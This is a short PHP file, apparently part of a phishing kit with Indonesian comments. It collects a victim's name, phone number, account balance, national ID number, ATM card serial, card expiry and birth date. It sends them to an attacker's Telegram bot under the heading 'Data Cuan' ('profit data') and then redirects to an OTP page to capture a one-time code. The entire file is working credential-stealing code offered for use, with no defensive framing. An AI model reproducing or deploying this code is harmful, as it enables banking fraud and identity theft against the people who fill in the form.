<?php
session_start();
include "tele.php";

// Ambil data lama dari SESSION (yang disimpan di skrip pertama)
$nama = $_SESSION['nama'] ?? '';  // Gunakan ?? untuk fallback jika kosong
$nomor = $_SESSION['nomor'] ?? '';
$saldo = $_SESSION['saldo'] ?? '';
$nik = $_SESSION['nik'] ?? '';

// Ambil data baru dari POST
$seri = $_POST['seri'] ?? '';
$masa = $_POST['masa'] ?? '';
$tanggal_lahir = $_POST['tanggal_lahir'] ?? '';

// Simpan data baru ke SESSION (untuk langkah selanjutnya jika ada)
$_SESSION['seri'] = $seri;
$_SESSION['masa'] = $masa;
$_SESSION['tanggal_lahir'] = $tanggal_lahir;

// Gabungkan semua data (lama + baru) untuk pesan
$message = "
├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
├───────────────────
├• *Nama* : " . $nama . "
├• *Nomor* : " . $nomor . "
├• *Saldo* : " . $saldo . "
├• *Nik Ktp* : " . $nik . "
├• *Seri ATM* : " . $seri . "
├• *Masa Berlaku* : " . $masa . "
├• *Tanggal Lahir* : " . $tanggal_lahir . "
╰───────────────────
";

// Fungsi sendMessage tetap sama
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Kirim pesan
sendMessage($telegram_id, $message, $token_bot);

// Redirect
header('Location: otp.html');
?>